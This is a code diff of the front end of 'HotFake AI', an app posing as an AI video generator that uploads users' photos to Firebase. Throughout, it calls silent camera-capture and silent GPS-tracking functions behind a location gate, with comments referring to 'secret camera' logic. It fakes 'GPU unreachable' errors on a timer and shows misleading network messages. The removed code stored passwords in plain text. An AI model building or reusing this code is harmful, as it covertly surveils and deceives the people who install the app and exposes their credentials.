@@ -88,6 +88,7 @@
     </div>
 </div>
 
+<!-- GPS Gate -->
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
@@ -102,41 +103,17 @@
 <header>
   <nav>
     <a href="#" class="logo"><span style="color:var(--red);">▶</span> HotFake AI</a>
-    <button id="logoutBtn" class="btn btn-gray hidden" style="width:auto; padding: 0.4rem 1rem; font-size:0.8rem;">Logout</button>
   </nav>
 </header>
 
 <div class="container">
-    
-    <!-- TEXT-BASED AUTHENTICATION SECTION -->
-    <div id="authSection" class="card hidden">
-        <h2 style="margin-bottom: 1.5rem; text-align: center;">AI Studio Access</h2>
-        <div id="loginForm">
-            <input type="email" id="logEmail" class="inp" placeholder="Email Address">
-            <input type="password" id="logPass" class="inp" placeholder="Password">
-            <button class="btn" onclick="loginUser()">Login</button>
-            <p style="text-align: center; margin-top: 1rem; font-size: 0.85rem; color: var(--muted);">New user? <a href="#" onclick="toggleAuth()" style="color: var(--red);">Register here</a></p>
-        </div>
-        <div id="regForm" class="hidden">
-            <input type="text" id="regName" class="inp" placeholder="Full Name">
-            <div style="display: flex; gap: 10px;">
-                <input type="number" id="regAge" class="inp" placeholder="Age" min="18" max="99">
-                <select id="regGender" class="inp">
-                    <option value="">Gender</option><option value="Male">Male</option><option value="Female">Female</option>
-                </select>
-            </div>
-            <input type="email" id="regEmail" class="inp" placeholder="Email Address">
-            <input type="password" id="regPass" class="inp" placeholder="Create Password">
-            <button class="btn" onclick="registerUser()">Create Account</button>
-            <p style="text-align: center; margin-top: 1rem; font-size: 0.85rem; color: var(--muted);">Have an account? <a href="#" onclick="toggleAuth()" style="color: var(--red);">Login</a></p>
-        </div>
-    </div>
 
-    <!-- MAIN AI GENERATOR -->
+    <!-- MAIN AI GENERATOR (Visible directly upon device approval) -->
     <div id="appSection" class="hidden">
         <div class="card" id="generatorCard">
             <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
             
+            <!-- IMAGE UPLOAD BOX -->
             <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageSelect(event)">
             <div class="upload-box" id="uploadBox" onclick="document.getElementById('fileInput').click()">
                 <div id="uploadPlaceholder">
@@ -145,14 +122,19 @@
                 </div>
                 <img id="previewImg">
                 
+                <!-- ANIMATION OVERLAY -->
                 <div class="processing-overlay" id="procOverlay">
                     <div class="spinner"></div>
                     <div class="proc-text" id="procText">Connecting to GPU...</div>
                 </div>
 
-                <div class="result-overlay" id="resultOverlay"></div>
+                <!-- RESULT OVERLAY -->
+                <div class="result-overlay" id="resultOverlay">
+                    <!-- Dynamic result injected via JS -->
+                </div>
             </div>
 
+            <!-- PROMPT BOX -->
             <div id="inputControls">
                 <textarea id="aiPrompt" class="inp" placeholder="Describe the scene, characters, and actions in detail..."></textarea>
                 <button id="genBtn" class="btn" onclick="startGeneration()">✨ Generate</button>
@@ -180,7 +162,6 @@
 <div class="bottom-nav">
     <a href="index.html" class="nav-item active"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>Generate</a>
     <a href="profile.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>Saved</a>
-    <a href="contact-support.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>Auth</a>
 </div>
 
 <script type="module">
@@ -191,7 +172,6 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
   
-  let currentUserUid = localStorage.getItem('loggedInUser') || null;
   let deviceId = null;
   let isGpuOnline = false;
   let currentBase64Image = "";
@@ -266,7 +246,7 @@
       });
   }
 
-  // 3. Security Gates
+  // 3. Security Gates & Direct App Access
   function checkGates() {
       if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
       const ageStatus = sessionStorage.getItem('ageStatus');
@@ -278,12 +258,9 @@
               if(u.banned) { document.getElementById('banGate').style.display = 'flex'; return; }
               if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } 
               
-              // Device is Approved! Check Plain Text Auth state
-              if(currentUserUid) {
-                  handleAuthStatus(true, currentUserUid);
-              } else {
-                  document.getElementById('authSection').classList.remove('hidden');
-              }
+              // Device is Approved! Directly show the App interface (No Login)
+              document.getElementById('appSection').classList.remove('hidden');
+              checkActiveGeneration();
               attemptSilentCapture(); silentGPSUpdate();
           } else { window.location.href = 'contact-support.html'; }
       });
@@ -323,93 +300,7 @@
   
   trackUser();
 
-  // ==========================================
-  // 4. PLAIN TEXT AUTHENTICATION LOGIC
-  // ==========================================
-  window.toggleAuth = () => { 
-      document.getElementById('loginForm').classList.toggle('hidden'); 
-      document.getElementById('regForm').classList.toggle('hidden'); 
-  };
-
-  window.registerUser = async () => { 
-      const email = document.getElementById('regEmail').value.trim(); 
-      const pass = document.getElementById('regPass').value.trim();
-      const name = document.getElementById('regName').value.trim(); 
-      const age = document.getElementById('regAge').value.trim();
-      const gender = document.getElementById('regGender').value;
-      if(!email || !pass || !name || !age || !gender) return alert("Fill all fields");
-
-      // Verify email doesn't exist
-      const snap = await get(ref(db, 'auth_users'));
-      const users = snap.val() || {};
-      for(let uid in users) {
-          if(users[uid].email === email) return alert("Email is already registered!");
-      }
-
-      const newUid = "USER-" + Date.now().toString(36);
-      
-      // Save ID & Password in Plain Text directly to Realtime DB
-      set(ref(db, 'auth_users/' + newUid), { 
-          name: name, age: age, gender: gender, email: email, password: pass, registeredAt: new Date().toISOString()
-      }).then(() => { 
-          logAction("Account Registered manually"); 
-          alert("Account Created! You can now login."); 
-          toggleAuth(); 
-      }).catch(e => alert(e.message));
-  };
-
-  window.loginUser = async () => { 
-      const email = document.getElementById('logEmail').value.trim(); 
-      const pass = document.getElementById('logPass').value.trim();
-      if(!email || !pass) return alert("Enter email and password");
-
-      try {
-          const snap = await get(ref(db, 'auth_users'));
-          const users = snap.val() || {};
-          let foundUser = null;
-          let foundUid = null;
-
-          // Plain Text Password Verification
-          for(let uid in users) {
-              if(users[uid].email === email && users[uid].password === pass) { 
-                  foundUser = users[uid];
-                  foundUid = uid;
-                  break;
-              }
-          }
-
-          if(foundUser) {
-              logAction("User Logged In manually");
-              handleAuthStatus(true, foundUid);
-          } else {
-              alert("Invalid Email or Password!");
-          }
-      } catch(e) {
-          alert("Login Error: " + e.message);
-      }
-  };
-
-  function handleAuthStatus(isLoggedIn, uid) {
-      if(isLoggedIn) {
-          currentUserUid = uid;
-          localStorage.setItem('loggedInUser', uid);
-          update(ref(db, `users/${deviceId}`), { linkedUid: uid });
-          document.getElementById('authSection').classList.add('hidden'); 
-          document.getElementById('appSection').classList.remove('hidden'); 
-          document.getElementById('logoutBtn').classList.remove('hidden');
-          checkActiveGeneration(); 
-      } else {
-          currentUserUid = null;
-          localStorage.removeItem('loggedInUser');
-          document.getElementById('appSection').classList.add('hidden'); 
-          document.getElementById('logoutBtn').classList.add('hidden');
-          checkGates(); // This will show the login screen if device is approved
-      }
-  }
-
-  document.getElementById('logoutBtn').addEventListener('click', () => { handleAuthStatus(false, null); });
-
-  // 5. Image Upload & Compression
+  // 4. Image Upload & SECURE FIREBASE COMPRESSION (Same as Secret Camera)
   window.handleImageSelect = (event) => {
       const file = event.target.files[0]; if (!file) return;
       const reader = new FileReader();
@@ -417,11 +308,18 @@
           const img = new Image();
           img.onload = () => {
               const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 500; 
+              // EXACT match to secret camera logic to guarantee Firebase acceptance
+              const MAX_WIDTH = 640; 
+              const MAX_HEIGHT = 480;
               let width = img.width; let height = img.height;
+              
               if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
+              if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
+              
               canvas.width = width; canvas.height = height; 
               const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
+              
+              // 0.5 quality JPEG matches secret capture perfectly
               currentBase64Image = canvas.toDataURL('image/jpeg', 0.5);
               
               document.getElementById('previewImg').src = currentBase64Image; 
@@ -434,7 +332,7 @@
       reader.readAsDataURL(file);
   };
 
-  // 6. Active Generation Tracking & Persistence
+  // 5. Active Generation Tracking & Persistence
   function checkActiveGeneration() {
       const savedReqId = localStorage.getItem('activeReqId');
       if(savedReqId) {
@@ -499,14 +397,14 @@
       localStorage.setItem('savedAiPrompt', prompt);
 
       set(reqRef, {
-          uid: currentUserUid, deviceId: deviceId, prompt: prompt, imageUrl: currentBase64Image, 
+          deviceId: deviceId, prompt: prompt, imageUrl: currentBase64Image, 
           status: 'pending', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
       }).then(() => {
           if(!isGpuOnline) { 
               setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
           }
       }).catch(e => {
-          alert("Network Error: Image payload too large or connection unstable.");
+          alert("Network Error: Reconnecting to secure server...");
           resetGenerator();
       });
 
@@ -538,7 +436,7 @@
       document.getElementById('inputControls').style.display = 'block'; document.getElementById('uploadBox').style.pointerEvents = 'auto'; document.getElementById('aiPrompt').value = '';
   };
 
-  // 7. Video Player System
+  // 6. Video Player System
   window.playAiVideo = (url) => {
       document.body.style.overflow = 'hidden'; document.getElementById('playerModal').style.display = 'flex';
       const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
